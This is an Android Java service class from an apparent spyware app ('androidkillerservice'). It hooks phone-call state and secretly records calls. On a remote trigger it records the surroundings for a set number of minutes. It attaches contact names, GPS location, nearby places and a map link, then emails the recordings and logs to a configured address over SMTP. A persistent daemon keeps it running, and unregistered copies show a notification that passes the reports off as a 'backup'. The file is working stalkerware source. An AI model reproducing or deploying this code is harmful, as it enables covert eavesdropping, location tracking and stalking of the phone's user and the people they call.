package com.shiliukeji.xc_lsy.androidkillerservice.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.elvishew.xlog.XLog;
import com.shiliukeji.xc_lsy.androidkillerservice.R;
import com.shiliukeji.xc_lsy.androidkillerservice.location.Location;
import com.xdandroid.hellodaemon.AbsWorkService;

import java.io.File;
import java.util.List;

import io.reactivex.disposables.Disposable;

/**
 * Created by XC_LSY on 2017/7/6.
 */

public class PhoneService  extends AbsWorkService {
    private static MediaRecorder mediaRecorder;
    private String addr;
    private String baiduMap;
    private File file;
    private File filedir;
    private boolean huanjingluyinFlag = false;
    private boolean incomingFlag = false;
    private String incoming_number;
    private boolean isPath = false;
    private boolean isRecord = false;
    private boolean isSended = false;
    public String outphoneNumber;
    private String pName;
    private GetSharePrefe paras;
    private String path;
    private String phoneNumber;
    private String poiString;
    private String shoujiName;
    private long startTime = 0;
    private long stopTime = 0;
    private SharedPreferences zcps;

    //是否 任务完成, 不再需要服务运行?
    public static boolean sShouldStopService = false;
    public static Disposable sDisposable;

    public static void stopService() {
        //我们现在不再需要服务运行了, 将标志位置为 true
        sShouldStopService = true;
        //取消对任务的订阅
        if (sDisposable != null) sDisposable.dispose();
        //取消 Job / Alarm / Subscription
        cancelJobAlarmSub();
    }

    private final class myPhoneStateListener extends PhoneStateListener {
        private myPhoneStateListener() {
        }

        public void onCallStateChanged(int state, String incomingNumber) {
            switch (state) {
                case 0:
                    if (PhoneService.mediaRecorder == null || !PhoneService.this.isRecord || PhoneService.this.file.length() <= 400) {
                        PhoneService.mediaRecorder = null;
                        PhoneService.this.isRecord = false;
                    } else {
                        PhoneService.this.stopRecording();
                    }
                    if (PhoneService.this.startTime != 0) {
                        PhoneService.this.stopTime = System.currentTimeMillis();
                        String temp = PhoneService.this.getNowState();
                        if (PhoneService.this.paras.isWeizhijilu()) {
                            PhoneService.this.getUserLocation();
                        }
                        String subject = new StringBuilder(String.valueOf(PhoneService.this.shoujiName)).append("发来--电话邮件(").append(temp).append("；位置:").append(PhoneService.this.addr).append(")").toString();
                        String content = "邮件标题：" + subject + "<br/>" + temp + "(" + PhoneService.this.pName + ")<br/>通话时长：" + OtherOperatorService.getTimeLenth(PhoneService.this.startTime, PhoneService.this.stopTime) + "(开始时间：" + OtherOperatorService.getCurrentTime(Long.valueOf(PhoneService.this.startTime)) + ")" + "<br/>通话内容：见附件" + PhoneService.this.phoneNumber + "<br/>附近信息：" + PhoneService.this.poiString + "<br/>" + PhoneService.this.baiduMap + "<br/>----------------------------------------<br/>" + OtherOperatorService.getTxtHistory(new File(PhoneService.this.filedir, "phone.txt"));
                        if (OtherOperatorService.check3Gwifi(PhoneService.this.getApplicationContext())) {
                            if (!PhoneService.this.isSended && PhoneService.this.paras.isUserSetOk()) {
                                String smtp = PhoneService.this.paras.getSmtp();
                                String port = PhoneService.this.paras.getPort();
                                String useremail = PhoneService.this.paras.getUserEmail();
                                String password = PhoneService.this.paras.getUserPassword();
                                if (PhoneService.this.file.exists()) {
                                    List<String> paths = OtherOperatorService.getFilePathList(PhoneService.this.filedir);
                                    if (PhoneService.this.paras.isAllnet()) {
                                        OtherOperatorService.uploadEmail(paths, PhoneService.this.path, smtp, port, useremail, password, useremail, useremail, subject, content);
                                        PhoneService.this.sendTongZhi(useremail, temp);
                                    } else if (PhoneService.this.paras.isWifi() && OtherOperatorService.checkwifiwork(PhoneService.this.getApplicationContext())) {
                                        OtherOperatorService.uploadEmail(paths, PhoneService.this.path, smtp, port, useremail, password, useremail, useremail, subject, content);
                                        PhoneService.this.sendTongZhi(useremail, temp);
                                    } else {
                                        PhoneService.this.file = new File(PhoneService.this.filedir, "phone.txt");
                                        if (PhoneService.this.file.exists()) {
                                            PhoneService.this.file.delete();
                                            PhoneService.this.file = new File(PhoneService.this.filedir, "phone.txt");
                                        }
                                        OtherOperatorService.txtFileSave(PhoneService.this.file, "1" + content);
                                    }
                                } else {
                                    OtherOperatorService.uploadEmail(smtp, port, useremail, password, useremail, new String[]{useremail}, subject, content);
                                    PhoneService.this.sendTongZhi(useremail, temp);
                                }
                                PhoneService.this.isSended = true;
                                PhoneService.this.startTime = 0;
                                PhoneService.this.stopTime = 0;
                                PhoneService.this.incomingFlag = false;
                                PhoneService.this.file = null;
                                PhoneService.this.filedir = null;
                                PhoneService.this.path = null;
                                PhoneService.this.phoneNumber = null;
                                PhoneService.this.outphoneNumber = null;
                                PhoneService.this.pName = null;
                                PhoneService.this.isRecord = false;
                                PhoneService.this.isPath = false;
                                return;
                            }
                            return;
                        } else if (!"".equals(subject)) {
                            PhoneService.this.file = new File(PhoneService.this.filedir, "phone.txt");
                            if (PhoneService.this.file.exists()) {
                                PhoneService.this.file.delete();
                                PhoneService.this.file = new File(PhoneService.this.filedir, "phone.txt");
                            }
                            OtherOperatorService.txtFileSave(PhoneService.this.file, "0" + content);
                            PhoneService.this.startTime = 0;
                            PhoneService.this.stopTime = 0;
                            PhoneService.this.incomingFlag = false;
                            PhoneService.this.file = null;
                            PhoneService.this.filedir = null;
                            PhoneService.this.path = null;
                            PhoneService.this.phoneNumber = null;
                            PhoneService.this.outphoneNumber = null;
                            PhoneService.this.pName = null;
                            subject = "";
                            PhoneService.this.isRecord = false;
                            PhoneService.this.isPath = false;
                            return;
                        } else {
                            return;
                        }
                    }
                    PhoneService.this.incomingFlag = false;
                    return;
                case 1:
                    PhoneService.this.incomingFlag = true;
                    PhoneService.this.incoming_number = incomingNumber;
                    PhoneService.this.pName = OtherOperatorService.getContactNameFromPhoneBook(PhoneService.this.getApplicationContext(), incomingNumber);
                    return;
                case 2:
                    if (PhoneService.mediaRecorder == null && !PhoneService.this.isRecord) {
                        PhoneService.this.readyFile();
                        PhoneService.this.isSended = false;
                        if (PhoneService.this.paras.isTonghualuyin() && PhoneService.this.isPath) {
                            PhoneService.this.startRecording();
                            return;
                        }
                        return;
                    }
                    return;
                default:
                    return;
            }
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public Boolean shouldStopService(Intent intent, int flags, int startId) {
        return sShouldStopService;
    }

    @Override
    public void startWork(Intent intent, int flags, int startId) {
        Location location = new Location();
        Location.updateListener();
        try {
            this.outphoneNumber = intent.getExtras().getString("outNumber");
            XLog.d("获取电话号码：" + outphoneNumber);
            this.pName = OtherOperatorService.getContactNameFromPhoneBook(getApplicationContext(), this.outphoneNumber);
        } catch (Exception e) {
            e.printStackTrace();
            XLog.d("未获取电话号码");
        }
        this.paras = new GetSharePrefe(getApplicationContext());
        this.zcps = getApplicationContext().getSharedPreferences("reg", 0);
        this.shoujiName = this.paras.getShoujiName();
        if (this.outphoneNumber == null || this.outphoneNumber.length() >= 3) {
            if (!this.isRecord) {
                ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).listen(new myPhoneStateListener(), 32);
            }
        } else if (!this.isRecord) {
            this.huanjingluyinFlag = true;
            readyFile();
            new Thread(new Runnable() {
                public void run() {
                    try {
                        if (PhoneService.this.isPath) {
                            PhoneService.this.startRecording();
                        }
                        Thread.sleep((long) ((Integer.parseInt(PhoneService.this.outphoneNumber) * 60) * 1000));
                        if (PhoneService.mediaRecorder == null || !PhoneService.this.isRecord) {
                            PhoneService.mediaRecorder = null;
                            PhoneService.this.isRecord = false;
                        } else {
                            PhoneService.this.stopRecording();
                            PhoneService.this.stopTime = System.currentTimeMillis();
                        }
                        String temp = PhoneService.this.getNowState();
                        PhoneService.this.huanjingluyinFlag = false;
                        if (PhoneService.this.paras.isWeizhijilu()) {
                            PhoneService.this.getUserLocation();
                        }
                        String subject = new StringBuilder(String.valueOf(PhoneService.this.shoujiName)).append("发来--环录邮件(").append(temp).append("；位置:").append(PhoneService.this.addr).append(")").toString();
                        String content = "邮件标题：" + subject + "<br/>" + temp + "<br/>" + "<br/>环录内容：见附件" + PhoneService.this.phoneNumber + "<br/>附近信息：" + PhoneService.this.poiString + "<br/>" + PhoneService.this.baiduMap + "<br/>----------------------------------------<br/>" + OtherOperatorService.getTxtHistory(new File(PhoneService.this.filedir, "phone.txt"));
                        if (OtherOperatorService.checkwifiwork(PhoneService.this.getApplicationContext())) {
                            String smtp = PhoneService.this.paras.getSmtp();
                            String port = PhoneService.this.paras.getPort();
                            String useremail = PhoneService.this.paras.getUserEmail();
                            String password = PhoneService.this.paras.getUserPassword();
                            if (PhoneService.this.file.exists()) {
                                OtherOperatorService.uploadEmail(OtherOperatorService.getFilePathList(PhoneService.this.filedir), PhoneService.this.path, smtp, port, useremail, password, useremail, useremail, subject, content);
                            } else {
                                String str = smtp;
                                String str2 = port;
                                String str3 = useremail;
                                String str4 = password;
                                String str5 = useremail;
                                OtherOperatorService.uploadEmail(str, str2, str3, str4, str5, new String[]{useremail}, subject, "录音文件不存在，本次环境录音未成功");
                            }
                        } else {
                            PhoneService.this.file = new File(PhoneService.this.filedir, "phone.txt");
                            if (PhoneService.this.file.exists()) {
                                PhoneService.this.file.delete();
                                PhoneService.this.file = new File(PhoneService.this.filedir, "phone.txt");
                            }
                            OtherOperatorService.txtFileSave(PhoneService.this.file, "0" + content);
                        }
                        PhoneService.this.startTime = 0;
                        PhoneService.this.file = null;
                        PhoneService.this.filedir = null;
                        PhoneService.this.path = null;
                        PhoneService.this.phoneNumber = null;
                        PhoneService.this.outphoneNumber = null;
                        PhoneService.this.pName = null;
                        PhoneService.this.isRecord = false;
                        PhoneService.this.isPath = false;
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
    }

    @Override
    public void stopWork(Intent intent, int flags, int startId) {
        stopService();
    }

    @Override
    public Boolean isWorkRunning(Intent intent, int flags, int startId) {
        //若还没有取消订阅, 就说明任务仍在运行.
        return sDisposable != null && !sDisposable.isDisposed();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent, Void alwaysNull) {
        return null;
    }

    @Override
    public void onServiceKilled(Intent rootIntent) {
        System.out.println("终止进程！");
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        Location location = new Location();
        Location.updateListener();
        try {
            this.outphoneNumber = intent.getExtras().getString("outNumber");
            XLog.d("获取电话号码：" + outphoneNumber);
            this.pName = OtherOperatorService.getContactNameFromPhoneBook(getApplicationContext(), this.outphoneNumber);
        } catch (Exception e) {
            e.printStackTrace();
            XLog.d("未获取电话号码");
        }
        this.paras = new GetSharePrefe(getApplicationContext());
        this.zcps = getApplicationContext().getSharedPreferences("reg", 0);
        this.shoujiName = this.paras.getShoujiName();
        if (this.outphoneNumber == null || this.outphoneNumber.length() >= 3) {
            if (!this.isRecord) {
                ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).listen(new myPhoneStateListener(), 32);
            }
        } else if (!this.isRecord) {
            this.huanjingluyinFlag = true;
            readyFile();
            new Thread(new Runnable() {
                public void run() {
                    try {
                        if (PhoneService.this.isPath) {
                            PhoneService.this.startRecording();
                        }
                        Thread.sleep((long) ((Integer.parseInt(PhoneService.this.outphoneNumber) * 60) * 1000));
                        if (PhoneService.mediaRecorder == null || !PhoneService.this.isRecord) {
                            PhoneService.mediaRecorder = null;
                            PhoneService.this.isRecord = false;
                        } else {
                            PhoneService.this.stopRecording();
                            PhoneService.this.stopTime = System.currentTimeMillis();
                        }
                        String temp = PhoneService.this.getNowState();
                        PhoneService.this.huanjingluyinFlag = false;
                        if (PhoneService.this.paras.isWeizhijilu()) {
                            PhoneService.this.getUserLocation();
                        }
                        String subject = new StringBuilder(String.valueOf(PhoneService.this.shoujiName)).append("发来--环录邮件(").append(temp).append("；位置:").append(PhoneService.this.addr).append(")").toString();
                        String content = "邮件标题：" + subject + "<br/>" + temp + "<br/>" + "<br/>环录内容：见附件" + PhoneService.this.phoneNumber + "<br/>附近信息：" + PhoneService.this.poiString + "<br/>" + PhoneService.this.baiduMap + "<br/>----------------------------------------<br/>" + OtherOperatorService.getTxtHistory(new File(PhoneService.this.filedir, "phone.txt"));
                        if (OtherOperatorService.checkwifiwork(PhoneService.this.getApplicationContext())) {
                            String smtp = PhoneService.this.paras.getSmtp();
                            String port = PhoneService.this.paras.getPort();
                            String useremail = PhoneService.this.paras.getUserEmail();
                            String password = PhoneService.this.paras.getUserPassword();
                            if (PhoneService.this.file.exists()) {
                                OtherOperatorService.uploadEmail(OtherOperatorService.getFilePathList(PhoneService.this.filedir), PhoneService.this.path, smtp, port, useremail, password, useremail, useremail, subject, content);
                            } else {
                                String str = smtp;
                                String str2 = port;
                                String str3 = useremail;
                                String str4 = password;
                                String str5 = useremail;
                                OtherOperatorService.uploadEmail(str, str2, str3, str4, str5, new String[]{useremail}, subject, "录音文件不存在，本次环境录音未成功");
                            }
                        } else {
                            PhoneService.this.file = new File(PhoneService.this.filedir, "phone.txt");
                            if (PhoneService.this.file.exists()) {
                                PhoneService.this.file.delete();
                                PhoneService.this.file = new File(PhoneService.this.filedir, "phone.txt");
                            }
                            OtherOperatorService.txtFileSave(PhoneService.this.file, "0" + content);
                        }
                        PhoneService.this.startTime = 0;
                        PhoneService.this.file = null;
                        PhoneService.this.filedir = null;
                        PhoneService.this.path = null;
                        PhoneService.this.phoneNumber = null;
                        PhoneService.this.outphoneNumber = null;
                        PhoneService.this.pName = null;
                        PhoneService.this.isRecord = false;
                        PhoneService.this.isPath = false;
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
        return Service.START_STICKY;
    }

    public void startRecording() {
        if (this.paras.isTonghualuyin()) {
            try {
                mediaRecorder = new MediaRecorder();
                mediaRecorder.setAudioSource(4);
                mediaRecorder.setAudioSamplingRate(16000);
                mediaRecorder.setOutputFormat(3);
                mediaRecorder.setAudioEncoder(1);
                mediaRecorder.setOutputFile(this.file.getAbsolutePath());
                mediaRecorder.prepare();
                mediaRecorder.start();
                this.isRecord = true;
            } catch (Exception e) {
                this.isRecord = false;
                mediaRecorder.reset();
                mediaRecorder.release();
                mediaRecorder = null;
            }
        }
    }

    public String getNowState() {
        String temp = "";
        if (this.huanjingluyinFlag) {
            return "环录:" + this.outphoneNumber + "分钟";
        }
        if (this.incomingFlag) {
            return "来电:" + this.incoming_number;
        }
        return "去电:" + this.outphoneNumber;
    }

    public void getUserLocation() {
        double tempj = Location.getLocation().getLongitude();
        String temps = new StringBuilder(String.valueOf(tempj)).append(",").append(Location.getLocation().getLatitude()).toString();
        this.baiduMap = "<img src=http://api.map.baidu.com/staticimage?center=" + temps + "&width=280&height=160&zoom=18&markers=" + temps + "&scale=2 />";
        this.addr = Location.getLocation().getAddr();
        if (this.addr == null) {
            this.addr = "位置信息不明";
        }
        String temppoi = Location.getLocation().getPoiStr();
        if (temppoi == null) {
            this.poiString = "位置周边信息不明";
        } else {
            this.poiString = OtherOperatorService.getSubstring(temppoi);
        }
    }

    public void sendTongZhi(String useremail, String temp) {
        if (!OtherOperatorService.isReg(this.paras.getUserEmail(), this.paras.getShoujiImei(), this.zcps.getString("zhucema", ""))) {
            OtherOperatorService.showNotisfy(getApplicationContext(), R.drawable.mytp, "温馨提示:你刚才的电话记录已为你备份至" + useremail + "邮箱", "温馨提示", new StringBuilder(String.valueOf(temp)).append("记录已为你备份至").append(useremail).append("邮箱").toString());
        }
    }

    public void stopRecording() {
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
        } catch (Exception e) {
            e.printStackTrace();
        }
        mediaRecorder = null;
        this.isRecord = false;
    }

    public void readyFile() {
        this.path = OtherOperatorService.setJtingPath(getApplicationContext());
        this.startTime = System.currentTimeMillis();
        if (this.path != null) {
            this.filedir = new File(this.path);
            if (!this.filedir.exists()) {
                this.filedir.mkdir();
            }
            if (this.incomingFlag) {
                this.phoneNumber = "laidian" + this.incoming_number + "_" + this.startTime + ".amr";
            } else if (this.huanjingluyinFlag) {
                this.phoneNumber = "hjluyin" + this.outphoneNumber + "_" + this.startTime + ".amr";
            } else {
                this.phoneNumber = "qudian" + this.outphoneNumber + "_" + this.startTime + ".amr";
            }
            this.file = new File(this.filedir, this.phoneNumber);
            this.isPath = true;
        }
    }

    public void onCreate() {
        super.onCreate();
        Log.i("111", "service线程：" + Thread.currentThread().getId());
    }
}

